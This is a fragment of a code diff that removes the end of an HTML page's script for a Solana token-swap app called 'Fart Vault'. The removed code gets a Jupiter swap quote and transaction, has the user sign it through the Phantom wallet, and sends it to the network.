-                    const quoteUrl = `https://quote-api.jup.ag/v6/quote?inputMint=${inputMint}&outputMint=${outputMint}&amount=${amount}&slippageBps=500`;
-                    const quoteResponse = await fetch(quoteUrl).then(res => res.json());
-
-                    addLog("Fetching swap transaction...", "info");
-                    const swapResponse = await fetch('https://quote-api.jup.ag/v6/swap', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ quoteResponse, userPublicKey: provider.publicKey.toBase58(), wrapAndUnwrapSol: true })
-                    }).then(res => res.json());
-
-                    const swapTransactionBuf = Buffer.from(swapResponse.swapTransaction, 'base64');
-                    const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
-                    
-                    addLog("Awaiting signature from wallet...", "info");
-                    const signedTransaction = await provider.signTransaction(transaction);
-                    
-                    addLog("Sending transaction...", "info");
-                    const txid = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: true });
-                    
-                    addLog(`Transaction sent! Signature: ${txid}`, "success");
-                    await connection.confirmTransaction(txid, 'confirmed');
-                    addLog(`✅ ${tradeType.charAt(0).toUpperCase() + tradeType.slice(1)} confirmed! View on Solscan: https://solscan.io/tx/${txid}`, "success");
-                 } catch (error) {
-                    addLog(`Jupiter ${tradeType} failed: ${error.message}`, "error");
-                 }
-            }
-            
-            const getProvider = () => {
-                if ('phantom' in window && window.phantom.solana?.isPhantom) return window.phantom.solana;
-                return null;
-            };
-
-            const initializeApp = () => {
-                // ... setup event listeners ...
-                const phantomProvider = getProvider();
-                if (phantomProvider) {
-                    phantomProvider.on("connect", () => updateWalletState(phantomProvider));
-                    phantomProvider.on("disconnect", () => updateWalletState(null));
-                    if (phantomProvider.isConnected) {
-                        updateWalletState(phantomProvider);
-                    }
-                }
-                 addLog("Fart Vault Initialized. Please connect your wallet.", "info");
-            };
-
-            initializeApp();
-        };
-        
-        window.onload = waitForLibsAndInitialize;
-    </script>
-</body>
-</html>
+  );
+}
